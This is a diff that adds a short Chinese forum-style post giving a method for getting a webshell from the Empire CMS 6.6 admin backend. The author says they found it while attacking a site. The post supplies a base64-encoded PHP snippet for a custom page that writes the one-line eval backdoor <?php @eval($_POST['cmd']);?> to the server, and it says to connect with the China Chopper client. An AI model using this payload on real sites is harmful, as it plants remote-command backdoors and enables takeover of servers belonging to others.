@@ -1,0 +1,13 @@
+帝国cms 6.6最新版本后台拿webshell方法
+
+不知道别人有没有发过。反正我昨天搞个站自己发现的。必须分享出来！！
+ 
+由于我日的那个站是帝国cms 6.6最新版本的，所以网上找了一些方法都失效了！
+ 
+自定义页面-增加自定义页面-随便写了xxx.php文件名，页面内容填写，<script language=”php”>echo base64_decode(“PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=”);</script>
+ 
+如果内容直接添一句话或者php大马是无用的，，因为他会生成xxx.php前先给你执行！！
+ 
+PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= 就是 <?php @eval($_POST['cmd']);?> 的base64加密。
+ 
+所以生成xxx.php后 会出现内容 <?php @eval($_POST['cmd']);?> 在文件里，然后用菜刀直接连接吧！！
